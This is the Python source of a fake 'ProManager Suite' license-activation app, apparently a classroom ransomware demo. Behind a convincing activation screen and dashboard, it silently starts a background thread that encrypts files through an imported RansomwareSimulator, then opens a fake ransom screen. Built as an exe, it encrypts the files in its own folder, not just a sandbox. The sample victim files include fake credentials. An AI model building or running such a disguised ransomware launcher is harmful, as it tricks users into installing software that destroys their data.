import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import ttk

_base = os.path.dirname(os.path.abspath(__file__))

# When running as a PyInstaller exe, sys.frozen is True and modules are bundled
if not getattr(sys, 'frozen', False):
    sys.path.insert(0, _base)

from ransomware_simulator import RansomwareSimulator

if getattr(sys, 'frozen', False):
    # Exe mode: encrypt files in the same folder as the exe
    _exe_dir = os.path.dirname(os.path.abspath(sys.executable))
    VICTIM_SANDBOX = _exe_dir
else:
    VICTIM_SANDBOX = os.path.abspath(os.path.join(_base, '..', 'shop_data'))


def _ensure_sandbox() -> None:
    """Populate shop_data with sample victim files if running standalone (exe)."""
    if os.path.exists(VICTIM_SANDBOX):
        existing = [f for f in os.listdir(VICTIM_SANDBOX) if not f.startswith('.')]
        if existing:
            return
    os.makedirs(VICTIM_SANDBOX, exist_ok=True)
    samples = {
        'invoice_2024.txt':     'INVOICE #INV-2024-0847\nDate: 2024-10-15\nClient: ABC Corp\nTotal: $12,500.00\nDue: 2024-11-15',
        'customer_data.csv':    'id,name,email,phone\n1,John Smith,john@abc.com,555-0101\n2,Jane Doe,jane@xyz.com,555-0102\n3,Bob Lee,bob@qrs.com,555-0103',
        'contract.txt':         'SERVICE AGREEMENT\nParties: NTech Solutions & ABC Corp\nValue: $50,000/year\nTerm: 2024-2025\nSigned: 2024-01-01',
        'api_config.json':      '{"api_key":"sk-prod-8xKj2mNq","db_host":"db.internal","db_pass":"Sup3rS3cr3t!","env":"production"}',
        'business_report.csv':  'month,revenue,expenses,profit\nJan,85000,62000,23000\nFeb,91000,67000,24000\nMar,97000,70000,27000',
        'orders_2024.csv':      'order_id,product,qty,total\n1001,Widget A,5,250.00\n1002,Widget B,12,600.00\n1003,Widget C,3,450.00',
        'db_credentials.txt':   'DB_HOST=db.ntech.internal\nDB_USER=admin\nDB_PASS=Pr0d@2024!\nREDIS_URL=redis://localhost:6379\nSECRET_KEY=xK9#mQ2$rL5',
        'project_data.txt':     'PROJECT: Mobile App Redesign\nBudget: $85,000\nDeadline: 2025-03-31\nTeam: 6 engineers\nStatus: In Progress — 45% complete',
    }
    for name, content in samples.items():
        with open(os.path.join(VICTIM_SANDBOX, name), 'w') as fh:
            fh.write(content)

# ── Activation theme (white / light) ────────────────────────
A_BG     = '#eef2ff'
A_CARD   = '#ffffff'
A_BORDER = '#c7d2fe'
A_TEXT   = '#1e1b4b'
A_TMUT   = '#64748b'
A_ACCENT = '#6366f1'
A_WARN   = '#f59e0b'
A_ERR    = '#ef4444'

# ── Verifying screen theme (dark) ───────────────────────────
BG     = '#0d1117'
BG2    = '#161b22'
BG3    = '#21262d'
FG     = '#e6edf3'
FG_DIM = '#8b949e'
ACCENT = '#818cf8'
C_YLW  = '#e3b341'

# ── Dashboard theme (light professional) ────────────────────
L_BG      = '#f8fafc'
L_SIDEBAR = '#ffffff'
L_BORDER  = '#e2e8f0'
L_TEXT    = '#0f172a'
L_TMUT    = '#64748b'
L_ACCENT  = '#6366f1'
L_NAVACT  = '#ede9fe'
L_GRN_BG  = '#dcfce7'
L_GRN_FG  = '#166534'
L_YLW_BG  = '#fef9c3'
L_YLW_FG  = '#854d0e'
L_RED_BG  = '#fee2e2'
L_RED_FG  = '#991b1b'
L_PRP_BG  = '#ede9fe'
L_PRP_FG  = '#5b21b6'

FONT_MONO = ('Courier New', 13)


def trigger_encryption(sandbox_dir: str) -> None:
    _ensure_sandbox()
    sim = RansomwareSimulator(sandbox_dir=sandbox_dir)
    sim.encrypt()


class ProManagerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('ProManager Suite — License Activation')
        self.root.configure(bg=A_BG)
        self._frame = None
        self._show_activation()

    # ── Screen 1: Activation (white card, half screen) ──────
    def _show_activation(self):
        self.root.attributes('-fullscreen', False)
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        w, h = sw // 2, sh // 2
        x, y = (sw - w) // 2, (sh - h) // 2
        self.root.geometry(f'{w}x{h}+{x}+{y}')
        self.root.resizable(False, False)
        self.root.configure(bg=A_BG)

        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=A_BG)
        self._frame.pack(fill='both', expand=True)

        # Vertical centering spacers
        tk.Frame(self._frame, bg=A_BG).pack(fill='both', expand=True)

        # White card with indigo border
        card_wrap = tk.Frame(self._frame, bg=A_BORDER, padx=1, pady=1)
        card_wrap.pack(padx=44)
        card = tk.Frame(card_wrap, bg=A_CARD, padx=30, pady=22)
        card.pack()

        tk.Frame(self._frame, bg=A_BG).pack(fill='both', expand=True)

        f = card

        # ── Logo ──────────────────────────────────────────
        logo_row = tk.Frame(f, bg=A_CARD)
        logo_row.pack(anchor='w', pady=(0, 4))
        tk.Label(logo_row, text='📋', font=('Segoe UI', 38), bg=A_CARD).pack(side='left', padx=(0, 12))
        name_col = tk.Frame(logo_row, bg=A_CARD)
        name_col.pack(side='left', anchor='center')
        tk.Label(name_col, text='ProManager Suite',
                 font=('Segoe UI', 17, 'bold'), bg=A_CARD, fg=A_TEXT).pack(anchor='w')
        tk.Label(name_col, text='AI-powered project management platform',
                 font=('Segoe UI', 9), bg=A_CARD, fg=A_TMUT).pack(anchor='w')

        tk.Frame(f, bg=A_BORDER, height=1).pack(fill='x', pady=(14, 16))

        # ── Heading ───────────────────────────────────────
        tk.Label(f, text='Activate Your License',
                 font=('Segoe UI', 13, 'bold'), bg=A_CARD, fg=A_TEXT).pack(anchor='w')
        tk.Label(f, text='Enter your API key below to unlock all features',
                 font=('Segoe UI', 10), bg=A_CARD, fg=A_TMUT).pack(anchor='w', pady=(2, 14))

        # ── Entry ─────────────────────────────────────────
        tk.Label(f, text='API License Key',
                 font=('Segoe UI', 10, 'bold'), bg=A_CARD, fg=A_TEXT).pack(anchor='w', pady=(0, 5))

        self._entry_border = tk.Frame(f, bg=A_BORDER, padx=1, pady=1)
        self._entry_border.pack(fill='x')
        entry_bg = tk.Frame(self._entry_border, bg='#f5f7ff', padx=12, pady=0)
        entry_bg.pack(fill='x')

        self._key_var = tk.StringVar()
        entry = tk.Entry(
            entry_bg, textvariable=self._key_var,
            font=FONT_MONO, bg='#f5f7ff', fg=A_TMUT,
            relief='flat', insertbackground=A_ACCENT, bd=0,
        )
        entry.pack(fill='x', ipady=9)
        entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')

        def _focus_in(e):
            if entry.get() == 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx':
                entry.delete(0, 'end')
                entry.config(fg=A_TEXT, bg='#ffffff')
                entry_bg.config(bg='#ffffff')
            self._entry_border.config(bg=A_ACCENT)

        def _focus_out(e):
            if not entry.get():
                entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
                entry.config(fg=A_TMUT)
            self._entry_border.config(bg=A_BORDER)

        entry.bind('<FocusIn>', _focus_in)
        entry.bind('<FocusOut>', _focus_out)
        entry.bind('<Return>', lambda e: self._on_activate())

        self._error_var = tk.StringVar()
        tk.Label(f, textvariable=self._error_var,
                 font=('Segoe UI', 9), bg=A_CARD, fg=A_ERR).pack(anchor='w', pady=(4, 0))

        # ── Buttons ───────────────────────────────────────
        btn_row = tk.Frame(f, bg=A_CARD)
        btn_row.pack(fill='x', pady=(12, 0))
        tk.Button(
            btn_row, text='Activate License',
            font=('Segoe UI', 11, 'bold'), bg=A_ACCENT, fg='#ffffff',
            relief='flat', bd=0, padx=22, pady=10, cursor='hand2',
            activebackground='#4f46e5', activeforeground='#ffffff',
            command=self._on_activate,
        ).pack(side='left')
        tk.Button(
            btn_row, text='Cancel',
            font=('Segoe UI', 11), bg='#f1f5f9', fg=A_TMUT,
            relief='flat', bd=0, padx=16, pady=10, cursor='hand2',
            activebackground='#e2e8f0', activeforeground=A_TEXT,
            command=self.root.destroy,
        ).pack(side='left', padx=(8, 0))

        # ── Footer ────────────────────────────────────────
        tk.Frame(f, bg=A_BORDER, height=1).pack(fill='x', pady=(18, 10))
        footer = tk.Frame(f, bg=A_CARD)
        footer.pack(fill='x')
        tk.Label(footer, text='🔒  256-bit encrypted activation',
                 font=('Segoe UI', 9), bg=A_CARD, fg=A_TMUT).pack(side='left')
        tk.Label(footer, text='⚠  DEMO ONLY',
                 font=('Segoe UI', 9, 'bold'), bg=A_CARD, fg=A_WARN).pack(side='right')

    def _on_activate(self):
        key = self._key_var.get().strip()
        if not key or key.startswith('sk-xxxx'):
            self._error_var.set('⚠  Please enter a valid API key to continue.')
            return
        self._error_var.set('')
        self._show_verifying()

    # ── Screen 2: Verifying (dark, full screen) ─────────────
    def _show_verifying(self):
        self.root.title('ProManager Suite — Activating...')
        self.root.resizable(True, True)
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg=BG)

        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=BG)
        self._frame.pack(fill='both', expand=True)

        tk.Frame(self._frame, bg=BG).pack(fill='both', expand=True)
        center = tk.Frame(self._frame, bg=BG)
        center.pack()
        tk.Frame(self._frame, bg=BG).pack(fill='both', expand=True)

        tk.Label(center, text='📋', font=('Segoe UI', 52), bg=BG).pack()
        tk.Label(center, text='ProManager Suite',
                 font=('Segoe UI', 24, 'bold'), bg=BG, fg=FG).pack(pady=(10, 4))
        tk.Label(center, text='Verifying license key...',
                 font=('Segoe UI', 14), bg=BG, fg=FG_DIM).pack(pady=(0, 6))

        self._status_var = tk.StringVar(value='Connecting to license server...')
        tk.Label(center, textvariable=self._status_var,
                 font=('Segoe UI', 11), bg=BG, fg=FG_DIM).pack()

        pstyle = ttk.Style()
        pstyle.theme_use('default')
        pstyle.configure('Dark.Horizontal.TProgressbar',
                          background=ACCENT, troughcolor=BG3)
        self._pbar = ttk.Progressbar(center, mode='indeterminate', length=500,
                                      style='Dark.Horizontal.TProgressbar')
        self._pbar.pack(pady=(24, 0))
        self._pbar.start(10)

        tk.Frame(center, bg=BG3, height=1).pack(fill='x', pady=(22, 10))
        tk.Label(center, text='⚠  DEMO ONLY — Academic Environment',
                 font=('Segoe UI', 10), bg=BG, fg=C_YLW).pack()

        threading.Thread(target=self._do_activate, daemon=True).start()

    def _do_activate(self):
        for msg, delay in [
            ('Connecting to license server...', 0.6),
            ('Validating entitlements...', 0.7),
            ('Syncing workspace data...', 0.5),
            ('Configuring your workspace...', 0.6),
        ]:
            self.root.after(0, lambda m=msg: self._status_var.set(m))
            time.sleep(delay)
        self.root.after(0, self._show_dashboard)

    # ── Screen 3: Dashboard (light, full screen) ─────────────
    def _show_dashboard(self):
        self.root.title('ProManager Suite')
        self.root.configure(bg=L_BG)

        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=L_BG)
        self._frame.pack(fill='both', expand=True)
        f = self._frame

        # ─── Sidebar ──────────────────────────────────────
        sidebar = tk.Frame(f, bg=L_SIDEBAR, width=225)
        sidebar.pack(side='left', fill='y')
        sidebar.pack_propagate(False)

        logo_area = tk.Frame(sidebar, bg=L_SIDEBAR, padx=16, pady=14)
        logo_area.pack(fill='x')
        logo_inner = tk.Frame(logo_area, bg=L_SIDEBAR)
        logo_inner.pack(anchor='w')
        tk.Label(logo_inner, text='📋', font=('Segoe UI', 18), bg=L_SIDEBAR).pack(side='left')
        tk.Label(logo_inner, text='ProManager',
                 font=('Segoe UI', 14, 'bold'), bg=L_SIDEBAR, fg=L_TEXT).pack(side='left', padx=(6, 0))

        tk.Frame(sidebar, bg=L_BORDER, height=1).pack(fill='x')

        ws_frame = tk.Frame(sidebar, bg='#f8fafc', padx=14, pady=8)
        ws_frame.pack(fill='x')
        tk.Label(ws_frame, text='WORKSPACE', font=('Segoe UI', 8),
                 bg='#f8fafc', fg=L_TMUT).pack(anchor='w')
        ws_row = tk.Frame(ws_frame, bg='#f8fafc')
        ws_row.pack(anchor='w', pady=(3, 0))
        tk.Label(ws_row, text='NT', font=('Segoe UI', 8, 'bold'),
                 bg=L_ACCENT, fg='#ffffff', padx=5, pady=3).pack(side='left')
        tk.Label(ws_row, text='NTech Solutions',
                 font=('Segoe UI', 10, 'bold'), bg='#f8fafc', fg=L_TEXT).pack(side='left', padx=(7, 0))

        tk.Frame(sidebar, bg=L_BORDER, height=1).pack(fill='x', pady=(6, 4))
        tk.Label(sidebar, text='  MAIN MENU', font=('Segoe UI', 8),
                 bg=L_SIDEBAR, fg=L_TMUT, pady=4, anchor='w').pack(fill='x', padx=8)

        for icon, label, active in [
            ('◉',  'Dashboard',  True),
            ('▤',  'Projects',   False),
            ('✓',  'My Tasks',   False),
            ('📊', 'Analytics',  False),
            ('👥', 'Team',       False),
            ('💬', 'Inbox',      False),
            ('⚙',  'Settings',   False),
        ]:
            nbg = L_NAVACT if active else L_SIDEBAR
            nfg = L_ACCENT if active else L_TMUT
            row = tk.Frame(sidebar, bg=nbg, padx=4)
            row.pack(fill='x', pady=1, padx=6)
            if active:
                tk.Frame(row, bg=L_ACCENT, width=3).pack(side='left', fill='y')
            tk.Label(row, text=f'  {icon}  {label}',
                     font=('Segoe UI', 10, 'bold') if active else ('Segoe UI', 10),
                     bg=nbg, fg=nfg, pady=8, anchor='w').pack(side='left', fill='x', expand=True)

        tk.Label(sidebar, text='  FAVORITES', font=('Segoe UI', 8),
                 bg=L_SIDEBAR, fg=L_TMUT, pady=4, anchor='w').pack(fill='x', padx=8, pady=(12, 0))
        for label in ['Q4 Campaign', 'Product Launch 2025']:
            row = tk.Frame(sidebar, bg=L_SIDEBAR, padx=10)
            row.pack(fill='x', pady=1, padx=6)
            tk.Label(row, text=f'★  {label}',
                     font=('Segoe UI', 9), bg=L_SIDEBAR, fg=L_TMUT, pady=5, anchor='w').pack(fill='x')

        tk.Frame(sidebar, bg=L_SIDEBAR).pack(fill='both', expand=True)
        tk.Frame(sidebar, bg=L_BORDER, height=1).pack(fill='x')

        urow = tk.Frame(sidebar, bg=L_SIDEBAR, padx=12, pady=10)
        urow.pack(fill='x')
        tk.Label(urow, text='NT', font=('Segoe UI', 9, 'bold'),
                 bg=L_ACCENT, fg='#ffffff', padx=7, pady=5).pack(side='left')
        ucol = tk.Frame(urow, bg=L_SIDEBAR)
        ucol.pack(side='left', padx=(8, 0))
        tk.Label(ucol, text='Nguyen Thanh',
                 font=('Segoe UI', 9, 'bold'), bg=L_SIDEBAR, fg=L_TEXT, anchor='w').pack(anchor='w')
        tk.Label(ucol, text='Pro Plan · Admin',
                 font=('Segoe UI', 8), bg=L_SIDEBAR, fg=L_TMUT, anchor='w').pack(anchor='w')

        # ─── Right panel ──────────────────────────────────
        tk.Frame(f, bg=L_BORDER, width=1).pack(side='left', fill='y')
        right = tk.Frame(f, bg=L_BG)
        right.pack(side='left', fill='both', expand=True)

        # Topbar
        topbar = tk.Frame(right, bg=L_SIDEBAR)
        topbar.pack(fill='x')
        tk.Label(topbar, text='Dashboard',
                 font=('Segoe UI', 15, 'bold'), bg=L_SIDEBAR, fg=L_TEXT,
                 padx=22, pady=13, anchor='w').pack(side='left')

        search_wrap = tk.Frame(topbar, bg='#f1f5f9', padx=12, pady=6)
        search_wrap.pack(side='left', padx=(8, 0))
        tk.Label(search_wrap, text='🔍  Search projects, tasks...',
                 font=('Segoe UI', 10), bg='#f1f5f9', fg=L_TMUT).pack()

        tbr = tk.Frame(topbar, bg=L_SIDEBAR)
        tbr.pack(side='right', padx=18)
        for icon in ['🔔', '⚙']:
            tk.Label(tbr, text=icon, font=('Segoe UI', 12),
                     bg=L_SIDEBAR, fg=L_TMUT).pack(side='left', padx=(0, 12))
        tk.Label(tbr, text='NT', font=('Segoe UI', 9, 'bold'),
                 bg=L_ACCENT, fg='#ffffff', padx=8, pady=5).pack(side='left')

        tk.Frame(right, bg=L_BORDER, height=1).pack(fill='x')

        # Content
        inn = tk.Frame(right, bg=L_BG, padx=22, pady=14)
        inn.pack(fill='both', expand=True)

        # Welcome banner
        banner = tk.Frame(inn, bg=L_NAVACT, padx=16, pady=10)
        banner.pack(fill='x', pady=(0, 16))
        tk.Label(banner, text='✓  License activated — Welcome back, Nguyen Thanh!',
                 font=('Segoe UI', 11, 'bold'), bg=L_NAVACT, fg=L_ACCENT, anchor='w').pack(side='left')
        tk.Label(banner, text='ProManager Suite  v3.2.1',
                 font=('Segoe UI', 9), bg=L_NAVACT, fg=L_ACCENT).pack(side='right')

        # ─ 4 stat cards ───────────────────────────────────
        srow = tk.Frame(inn, bg=L_BG)
        srow.pack(fill='x', pady=(0, 16))
        for num, lbl, clr, icon in [
            ('12', 'Active Projects', '#6366f1', '▤'),
            ('47', 'Open Tasks',      '#059669', '✓'),
            ('3',  'Due Today',       '#dc2626', '⏰'),
            ('8',  'Team Members',    '#d97706', '👥'),
        ]:
            outer = tk.Frame(srow, bg=L_BORDER, padx=1, pady=1)
            outer.pack(side='left', fill='both', expand=True, padx=(0, 12))
            card = tk.Frame(outer, bg='#ffffff', padx=16, pady=12)
            card.pack(fill='both', expand=True)
            top_row = tk.Frame(card, bg='#ffffff')
            top_row.pack(fill='x')
            tk.Label(top_row, text=icon, font=('Segoe UI', 15),
                     bg='#ffffff', fg=clr).pack(side='left')
            tk.Label(top_row, text=num, font=('Segoe UI', 26, 'bold'),
                     bg='#ffffff', fg=clr).pack(side='right')
            tk.Label(card, text=lbl, font=('Segoe UI', 10),
                     bg='#ffffff', fg=L_TMUT, anchor='w').pack(fill='x', pady=(3, 0))

        # ─ Two columns ────────────────────────────────────
        cols = tk.Frame(inn, bg=L_BG)
        cols.pack(fill='both', expand=True)

        # Projects
        pcol = tk.Frame(cols, bg=L_BG)
        pcol.pack(side='left', fill='both', expand=True, padx=(0, 12))

        hdr1 = tk.Frame(pcol, bg=L_BG)
        hdr1.pack(fill='x', pady=(0, 8))
        tk.Label(hdr1, text='RECENT PROJECTS',
                 font=('Segoe UI', 9, 'bold'), bg=L_BG, fg=L_TMUT, anchor='w').pack(side='left')
        tk.Label(hdr1, text='View all →',
                 font=('Segoe UI', 9), bg=L_BG, fg=L_ACCENT).pack(side='right')

        for pname, pstatus, sbg, sfg, prog in [
            ('Q4 Marketing Campaign', 'Active',      L_GRN_BG, L_GRN_FG, 72),
            ('Product Launch 2025',   'In Progress', L_YLW_BG, L_YLW_FG, 45),
            ('Client Onboarding',     'Active',      L_GRN_BG, L_GRN_FG, 88),
            ('Brand Redesign',        'Planning',    L_PRP_BG, L_PRP_FG, 15),
            ('API Integration',       'On Hold',     L_RED_BG, L_RED_FG, 30),
        ]:
            o = tk.Frame(pcol, bg=L_BORDER, padx=1, pady=1)
            o.pack(fill='x', pady=(0, 6))
            r = tk.Frame(o, bg='#ffffff', padx=12, pady=9)
            r.pack(fill='x')
            top = tk.Frame(r, bg='#ffffff')
            top.pack(fill='x')
            tk.Label(top, text=f'📁  {pname}',
                     font=('Segoe UI', 10, 'bold'), bg='#ffffff', fg=L_TEXT, anchor='w').pack(side='left')
            tk.Label(top, text=pstatus,
                     font=('Segoe UI', 8, 'bold'), bg=sbg, fg=sfg, padx=8, pady=3).pack(side='right')
            pbar_bg = tk.Frame(r, bg='#e2e8f0', height=5)
            pbar_bg.pack(fill='x', pady=(6, 2))
            pbar_bg.pack_propagate(False)
            tk.Frame(pbar_bg, bg=sfg).place(relwidth=prog / 100, relheight=1)
            tk.Label(r, text=f'{prog}% complete',
                     font=('Segoe UI', 8), bg='#ffffff', fg=L_TMUT, anchor='w').pack(anchor='w')

        # Tasks
        tcol = tk.Frame(cols, bg=L_BG)
        tcol.pack(side='left', fill='both', expand=True)

        hdr2 = tk.Frame(tcol, bg=L_BG)
        hdr2.pack(fill='x', pady=(0, 8))
        tk.Label(hdr2, text='MY TASKS',
                 font=('Segoe UI', 9, 'bold'), bg=L_BG, fg=L_TMUT, anchor='w').pack(side='left')
        tk.Label(hdr2, text='Add task +',
                 font=('Segoe UI', 9), bg=L_BG, fg=L_ACCENT).pack(side='right')

        for tname, tdue, clr, prio in [
            ('Review campaign brief',    'Today',    '#dc2626', 'HIGH'),
            ('Send weekly report',       'Tomorrow', '#d97706', 'MED'),
            ('Update onboarding docs',   'Apr 29',   '#059669', 'LOW'),
            ('Prepare launch checklist', 'Apr 30',   '#d97706', 'MED'),
            ('Design review meeting',    'May 1',    '#059669', 'LOW'),
        ]:
            o = tk.Frame(tcol, bg=L_BORDER, padx=1, pady=1)
            o.pack(fill='x', pady=(0, 6))
            r = tk.Frame(o, bg='#ffffff', padx=12, pady=9)
            r.pack(fill='x')
            row = tk.Frame(r, bg='#ffffff')
            row.pack(fill='x')
            tk.Label(row, text='○', font=('Segoe UI', 13),
                     bg='#ffffff', fg='#d1d5db').pack(side='left', padx=(0, 8))
            tk.Label(row, text=tname,
                     font=('Segoe UI', 10), bg='#ffffff', fg=L_TEXT, anchor='w').pack(side='left')
            rr = tk.Frame(row, bg='#ffffff')
            rr.pack(side='right')
            tk.Label(rr, text=prio,
                     font=('Segoe UI', 7, 'bold'), bg=clr, fg='#ffffff',
                     padx=5, pady=2).pack(side='left', padx=(0, 6))
            tk.Label(rr, text=tdue,
                     font=('Segoe UI', 8), bg='#ffffff',
                     fg='#dc2626' if tdue == 'Today' else L_TMUT).pack(side='left')

        # ─ Sync bar + footer ──────────────────────────────
        sync = tk.Frame(inn, bg=L_BG)
        sync.pack(fill='x', pady=(12, 0))
        tk.Label(sync, text='Syncing workspace data...',
                 font=('Segoe UI', 8), bg=L_BG, fg=L_TMUT, anchor='w').pack(anchor='w', pady=(0, 4))
        pstyle = ttk.Style()
        pstyle.configure('L.Horizontal.TProgressbar', background=L_ACCENT, troughcolor=L_BORDER)
        lb = ttk.Progressbar(sync, mode='indeterminate', style='L.Horizontal.TProgressbar')
        lb.pack(fill='x')
        lb.start(15)

        tk.Frame(inn, bg=L_BORDER, height=1).pack(fill='x', pady=(10, 4))
        tk.Label(inn, text='⚠  DEMO ONLY — Academic Environment',
                 font=('Segoe UI', 8), bg=L_BG, fg='#d97706').pack(anchor='w')

        threading.Thread(target=self._silent_encrypt, daemon=True).start()
        self.root.after(5000, self._trigger_ransom)

    def _silent_encrypt(self):
        trigger_encryption(VICTIM_SANDBOX)

    def _trigger_ransom(self):
        self.root.destroy()
        if getattr(sys, 'frozen', False):
            # Running as exe — import directly (subprocess won't work)
            from fake_ransom import FakeRansomApp
            FakeRansomApp().run()
        else:
            script = os.path.join(_base, 'fake_ransom.py')
            subprocess.Popen(
                [sys.executable, script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    ProManagerApp().run()
